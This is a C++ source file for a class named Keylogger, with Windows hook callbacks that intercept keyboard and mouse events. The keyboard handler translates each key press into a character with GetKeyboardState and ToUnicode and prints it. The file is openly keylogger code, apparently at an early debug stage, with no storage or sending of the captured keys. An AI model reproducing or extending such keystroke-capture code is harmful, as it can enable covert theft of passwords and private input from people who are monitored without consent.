#include "Keylogger.hpp"

extern HHOOK g_hook[2];

LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	DWORD tmp = static_cast<DWORD>(lParam);
	int count = tmp & 0xFFFF;
	int scanCode = tmp & 0xFF0000;
	bool extend = tmp & 0x1000000;
	bool context = tmp & 0x20000000;
	bool up = tmp & 0x40000000;
	bool transition = tmp & 0x80000000;

	if (!up)
	{
		wchar_t name[255] = { 0 };
		WORD c;
		BYTE keyboardState[256] = { 0 };

		std::wcout << (char)wParam << " | " << count << " | " << scanCode << " | " << extend << " | " << context << " | " << up << " | " << transition << std::endl;
		if (!GetKeyboardState(keyboardState))
			return CallNextHookEx(g_hook[0], code, wParam, lParam);
		int size = ToUnicode(wParam, scanCode, keyboardState, name, 0xFF, 0);
		if (size < 0)
			return CallNextHookEx(g_hook[0], code, wParam, lParam);
		std::wcout << "Test => ";
		for (int i = 0; i < size; i++)
			std::cout << (char)name[i];
		std::cout << std::endl;
	}
	return CallNextHookEx(g_hook[0], code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(g_hook[1], code, wParam, lParam);

	MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;

//	if (wParam == )
		std::cout << "Salut" << std::endl;
	return CallNextHookEx(g_hook[1], code, wParam, lParam);
}
